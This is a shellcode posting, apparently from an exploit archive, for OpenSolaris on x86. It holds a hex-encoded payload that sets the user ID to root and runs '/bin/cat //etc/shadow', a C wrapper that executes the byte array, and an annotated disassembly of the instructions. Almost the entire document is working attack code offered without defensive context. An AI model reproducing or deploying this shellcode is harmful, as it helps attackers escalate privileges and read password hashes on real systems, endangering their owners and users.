Name = John Babio
Twitter = 3vi1john

SunOS opensolaris 10  5.11 i86pc i386 i86pc

setuid(0)  /bin/cat //etc/shadow

char code[]=
        "\x33\xc0\x50\x50\xb0\x17\xcd\x91\x33\xd2\x52\x68\x61\x64\x6f"
        "\x77\x68\x63\x2f\x73\x68\x68\x2f\x2f\x65\x74\x8b\xcc\x52\x68"
        "\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x8b\xdc\x52\x51\x53\x8b"
        "\xcc\x52\x51\x53\xb0\x3b\x52\xcd\x91\x33\xc0\x50\xb0\x01\xcd\x91";

int main(int argc, char **argv)
{
  int (*func)();
  func = (int (*)()) code;
  (int)(*func)();
}

8050410 <_start>:
 8050410:    33 c0                    xor    %eax,%eax
 8050412:    50                       push   %eax
 8050413:    50                       push   %eax
 8050414:    b0 17                    mov    $0x17,%al
 8050416:    cd 91                    int    $0x91
 8050418:    33 d2                    xor    %edx,%edx
 805041a:    52                       push   %edx
 805041b:    68 61 64 6f 77           push   $0x776f6461
 8050420:    68 63 2f 73 68           push   $0x68732f63
 8050425:    68 2f 2f 65 74           push   $0x74652f2f
 805042a:    8b cc                    mov    %esp,%ecx
 805042c:    52                       push   %edx
 805042d:    68 2f 63 61 74           push   $0x7461632f
 8050432:    68 2f 62 69 6e           push   $0x6e69622f
 8050437:    8b dc                    mov    %esp,%ebx
 8050439:    52                       push   %edx
 805043a:    51                       push   %ecx
 805043b:    53                       push   %ebx
 805043c:    8b cc                    mov    %esp,%ecx
 805043e:    52                       push   %edx
 805043f:    51                       push   %ecx
 8050440:    53                       push   %ebx
 8050441:    b0 3b                    mov    $0x3b,%al
 8050443:    52                       push   %edx
 8050444:    cd 91                    int    $0x91
 8050446:    33 c0                    xor    %eax,%eax
 8050448:    50                       push   %eax
 8050449:    b0 01                    mov    $0x1,%al
 805044b:    cd 91                    int    $0x91